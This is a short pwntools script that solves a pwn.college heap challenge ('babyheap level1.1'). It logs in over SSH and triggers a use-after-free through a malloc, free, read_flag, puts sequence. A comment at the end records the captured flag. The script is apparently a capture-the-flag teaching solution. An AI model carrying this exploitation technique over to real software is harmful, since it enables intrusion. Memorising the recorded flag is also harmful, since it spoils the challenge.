from pwn import *

s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level1.1")

io.sendlineafter(b": ", b"malloc")
io.sendlineafter(b"Size: ", b"256")
io.sendlineafter(b": ", b"free")
io.sendlineafter(b": ", b"read_flag")
io.sendlineafter(b": ", b"puts")

io.recvuntil(b'Data: ')
flag = io.recvline().decode()
s.close()

info("Flag: " + flag)
# Flag: pwn.college{4Pgu6Rh9Rw6Vegbmw5uaO-TB03z.0lM3MDLxIjNyEzW}